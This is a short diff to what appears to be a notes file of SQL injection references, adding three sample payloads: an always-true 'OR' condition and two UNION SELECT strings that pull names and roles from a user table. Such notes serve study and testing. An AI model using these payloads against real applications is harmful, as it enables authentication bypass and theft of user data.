@@ -13,3 +13,12 @@ https://brightsec.com/blog/sql-injection-attack/
 https://www.linode.com/docs/guides/sql-injection-attack/
 
 https://owasp.org/www-community/attacks/SQL_Injection
+
+## Sample injection
+
+`sample' OR '5'='5`
+
+`' AND role = 'ADMIN' UNION SELECT name from user WHERE phone_number='456`
+
+`' AND role = 'ADMIN' UNION SELECT role from user WHERE phone_number='456`
+
